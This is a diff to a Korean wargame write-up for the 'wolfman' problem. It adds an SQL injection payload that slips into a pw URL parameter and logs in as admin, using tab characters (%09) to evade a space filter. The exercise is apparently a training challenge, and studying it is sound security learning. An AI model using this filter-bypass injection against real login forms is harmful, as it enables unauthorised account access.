@@ -1,2 +1,10 @@
 ## Q5. wolfman
 <img src="/photo/prob_05.PNG" width="100%" height="100%" alt="problem"></img>
+
+#### 5thofnovmbr
+```
+풀이: ?pw=%27%09or%09id=%27admin%27--%09
+```
+```diff
++ %20대신 %09를 쓸 수 있다. 
+```
